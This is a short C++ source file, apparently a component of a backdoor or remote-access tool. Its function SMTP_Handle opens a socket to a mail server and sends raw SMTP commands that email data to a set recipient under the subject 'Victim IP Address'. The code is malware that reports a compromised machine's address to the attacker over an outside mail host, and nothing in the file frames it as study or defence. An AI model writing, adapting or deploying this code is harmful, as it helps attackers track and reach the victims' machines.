//The NC functions implementation.
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#include "stdafx.h"
#include "ClientSocket.h"
#include "SocketException.h"
#include "ClieFunc.h"
#include <fstream>   // using file streams

//==============================================================================
void SMTP_Handle(const char* serverName,const char* RcpAddrs,const string data,const string Sender,const int Port)
{
	string buff;
	
	//Create Client socket.
	//	ClientMailSocket_t client_socket(Port,serverName);  
	ClientSocket client_socket(Port,serverName);  

	client_socket<<"MAIL FROM :"<<Sender<<"\n";
	client_socket<<"RCPT TO :"<<RcpAddrs<<"\n";
	client_socket<<"DATA\n";
	client_socket<<"subject: "<<"Victim IP Address"<<"\n";
	client_socket<<data<<"\n";
	client_socket<<".\n";
	client_socket<<"quit\n";
}
//===========================================================================
